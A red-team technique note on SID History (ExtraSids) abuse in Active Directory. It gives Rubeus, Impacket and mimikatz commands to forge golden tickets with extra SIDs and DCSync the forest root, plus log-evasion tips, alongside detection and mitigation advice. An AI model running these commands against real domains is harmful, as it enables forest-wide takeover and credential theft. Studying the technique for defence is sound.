---
title: SID History Abuse
aliases: ["SID History attack", "SID History injection", "ExtraSids"]
type: technique
domain: [red-team]
attack_tactic: [privesc, persistence]
tags: [type/technique, domain/red-team, attack/privesc, proto/kerberos]
source:
  - "[[Source - zer1t0 - Attacking Active Directory]]"
  - "[[Source - harmj0y blog]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[SID]]", "[[PAC]]", "[[Golden Ticket]]", "[[Domain and Forest Trusts]]", "[[Inter-realm TGT]]", "[[Forest]]", "[[DCSync]]"]
created: 2026-06-06
updated: 2026-06-07
---

# SID History Abuse

> [!summary] One-liner
> Inject a privileged SID (e.g. parent-domain Enterprise Admins) into a ticket's PAC so the target domain grants you that group's access.

## Concept abused
The **`sIDHistory`** attribute (built for migrations) lets a principal carry SIDs from another domain, and these are honored across **[[Domain and Forest Trusts|trusts]]** within a forest. Forging the **[[PAC]]** with extra SIDs makes the target domain treat you as a member of those groups.

## Prerequisites
- Compromise of a child domain (krbtgt key for a [[Golden Ticket]]) + the **parent/target domain SID**.

## How the attack works
1. Forge a Golden Ticket in the child domain.
2. Add the parent's **Enterprise Admins** SID (`<parentDomainSID>-519`) as an **extra SID**.
3. The parent domain honors the SID-history SID ⇒ forest-level access (child → forest root).

## Commands & tools
```powershell
# Rubeus / mimikatz golden ticket with extra SIDs
Rubeus.exe golden /krbtgt:<childkrbtgt> /domain:child.contoso.local /sid:<childSID> \
  /sids:<parentSID>-519 /user:Administrator /ptt
```
```bash
# Impacket
ticketer.py -nthash <childkrbtgt> -domain-sid <childSID> -domain child.contoso.local \
  -extra-sid <parentSID>-519 Administrator
```

## Detection / artifacts
Tickets containing cross-domain/privileged SIDs in sIDHistory; PAC with unexpected SIDs; ticket without AS-REQ.

## Mitigation
**SID Filtering** on trusts (quarantines foreign SIDs), tier-0 isolation, monitor sIDHistory.

## More from harmj0y (ExtraSids: child → forest root via Mimikatz golden ticket + DCSync)

This is the canonical "Mimikatz and DCSync and ExtraSids, oh my" workflow: compromise a **child** domain and pivot to the **forest root** by forging a golden ticket whose PAC carries elevated root-domain SIDs. Because intra-forest trusts do **not** apply SID filtering, the root DC honors those SIDs.

### What you need (per harmj0y)
1. **Child domain krbtgt hash** — obtain via [[DCSync]].
2. **Child domain SID** — visible in the DCSync output.
3. **Target account name** — best to use the **child DC machine account** (e.g. `SECONDARY$`) rather than `Administrator` (fewer logs).
4. **Forest root FQDN.**
5. **Forest root Enterprise Admins SID** — ends in `-519`.
6. **Additional SIDs** worth adding for full DC-level rights (per the post's corrections):
   - Domain Controllers group: `S-1-5-21-<rootDomain>-516`
   - Enterprise Domain Controllers (well-known): `S-1-5-9`
   - The child DC machine account's full SID (as `/id`)

### Finding the Enterprise Admins SID
Translate the `krbtgt` (or any) account to a SID, then swap the final RID `-502` for `-519`:
```powershell
(New-Object System.Security.Principal.NTAccount("testlab.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
# S-1-5-21-*-*-*-502  ->  replace tail with -519 for Enterprise Admins
```

### Mimikatz golden ticket (ExtraSids)
Original form:
```
kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7
 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942
 /sids:S-1-5-21-456218688-4216621462-1491369290-519 /ptt
```
Revised/improved form (adds DC groups + machine-account `/id` for cleaner DC-as-DC access):
```
kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7
 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942
 /groups:516 /sids:S-1-5-21-456218688-4216621462-1491369290-516,S-1-5-9
 /id:S-1-5-21-4275052721-3205085442-2770241942-1002 /ptt
```

### Cross-domain DCSync (proof of forest compromise)
With the ExtraSids ticket injected, run [[DCSync]] against the **root** domain to pull the root `krbtgt` (enabling a forest-wide [[Golden Ticket]]):
```
lsadump::dcsync /user:TESTLAB\krbtgt /domain:testlab.local
```
End-to-end via PowerShell remoting from your foothold to the child DC, chaining forge → DCSync → purge:
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:SECONDARY$ /krbtgt:... /domain:dev.testlab.local /sid:... /groups:516 /sids:S-1-5-21-456218688-4216621462-1491369290-516,S-1-5-9 /id:... /ptt" "lsadump::dcsync /domain:testlab.local /dc:Primary.testlab.local /user:testlab\krbtgt" "kerberos::purge"' -ComputerName SECONDARY.dev.testlab.local
```

### Why krbtgt is mandatory
The child `krbtgt` hash is the symmetric key used to encrypt/sign TGTs in that realm. Without it, no DC will validate the forged ticket, regardless of which SIDs it carries.

### OPSEC notes (harmj0y)
- **Use the DC machine account** (`SECONDARY$`), not `Administrator`, for the DCSync — it blends in and generates fewer log entries.
- **20-minute caveat:** if `/id` is set to a RID other than the default `500`, the resulting ticket "will only work for 20 minutes" — still ample for the chain.
- The `kerberos::purge` at the end of the chain clears the injected ticket from memory.

### Mitigation emphasis (harmj0y)
- **Intra-forest trusts do not implement SID filtering**, which is precisely why ExtraSids works; cross-forest trusts theoretically should filter unknown SIDs (with historical implementation gaps).
- **Forest-wide remediation:** it is **not** enough to roll the `krbtgt` of just the root (or just the compromised) domain — you must roll the `krbtgt` hash for **ALL domains in the forest**, since compromise of any single domain's krbtgt leads to full forest compromise.

## Related
- Built on [[Golden Ticket]] + [[PAC]]; alternative cross-domain path: [[Inter-realm TGT]]. Reinforces that the [[Forest]] is the security boundary. Proven via [[DCSync]] against the forest root.

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "SID History attack"
- [[Source - harmj0y blog]] — "Mimikatz and DCSync and ExtraSids, oh my" — https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/
